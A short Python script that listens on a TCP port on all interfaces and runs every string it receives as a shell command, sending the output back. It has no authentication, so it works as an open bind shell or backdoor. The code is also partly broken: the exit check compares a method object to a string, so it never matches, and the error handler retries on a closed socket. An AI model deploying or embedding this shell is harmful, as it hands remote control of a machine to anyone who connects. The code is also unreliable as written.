import socket
import subprocess
import os

host = "0.0.0.0"
port = int(os.getenv("PY3_PORT_SOCKET")) if os.getenv(
    "PY3_PORT_SOCKET") != None else 3000

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def run_socket():

    print(f"Starting Connection Stream Socket on {host}:{port}")

    server.bind((host, port))
    server.listen(1)

    s, _ = server.accept()
    s.sendall("Socket Connected...".encode("utf-8"))
    while True:
        m = s.recv(1024).decode("utf-8")
        if m.lower == 'exit':
            s.sendall("Socket Connection Close..".encode("utf-8"))
            break
        o = subprocess.run(m, capture_output=True, shell=True, text=True)
        if o.stdout == "":
            s.sendall("OK".encode("utf-8"))
        else:
            s.sendall(o.stdout.encode("utf-8"))


try:
    run_socket()
except OSError as e:
    if e.errno == 48:
        print("Port Has Ben Used, Try Change Other Port")
except Exception as e:
    print(f"Socket Server Error {e}")
    server.close()
    server.shutdown()
    run_socket()
except KeyboardInterrupt:
    server.close()
finally:
    server.close()
